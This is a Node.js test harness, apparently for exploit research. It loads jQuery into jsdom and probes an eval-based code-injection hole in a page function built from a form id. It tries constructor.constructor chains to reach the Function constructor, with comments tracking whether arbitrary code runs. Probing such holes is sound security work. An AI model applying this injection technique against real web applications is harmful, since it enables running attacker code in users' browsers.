const fs = require("fs");
const { JSDOM } = require("jsdom");
const jq = fs.readFileSync(__dirname + "/jq371.js", "utf8");

function test(format) {
  const d = new JSDOM(
    `<form id="poly_x" data-formula="x"><input id="x_standard" name="x" value="1"><input id="y_standard" name="y" value="2"><input name="formula" value="x"><div id="template_standard"></div></form>`,
    { runScripts: "dangerously", pretendToBeVisual: true, url: "https://x/" });
  const w = d.window;
  const s = w.document.createElement("script"); s.textContent = jq; w.document.head.appendChild(s);
  const $ = w.$;
  const form = w.document.querySelector("form");
  form.id = "poly_" + format;
  const sel = form.id.replace("poly_", "");
  let r = { len: null, pwn: false };
  try {
    const T = $("#template_" + sel);
    r.len = T.length;
    if (T.length === 0) {
      w.__P__ = false;
      w.type_standard = function () { return 1; };
      try {
        w.eval("window.__run=function(selected){ return eval('type_'+selected+'(this, selected)'); }");
        w.__run.call(form, sel);
        r.pwn = !!w.__P__;
      } catch (e) { r.ev = e.message.split("\n")[0]; }
    }
  } catch (e) { r.se = e.message.split("\n")[0]; }
  return r;
}

// arg1 = form (bad Function param). Try chains that make the 2-arg call run code.
// Idea: reach String.prototype method? No. Reach a fn whose (a,b) runs b.
// KEY: type_standard.constructor.constructor is Function. Function(form, body) -> param err.
// But Function accepts arg1 if it's a VALID param list string. form -> "[object HTMLFormElement]".
// Neutralize: we can't change arg1. BUT we can target a fn that IGNORES arg count via .apply-less.
// Try: make selected such that the FIRST identifier is a member of `this`(form) reachable? no, base is type_<format>.
const cands = [
  "standard.constructor.constructor",
  "standard.constructor.constructor.bind",
  "standard.constructor.constructor.apply",
  "standard.constructor.constructor.call",
];
for (const c of cands) console.log(c, "=>", JSON.stringify(test(c)));
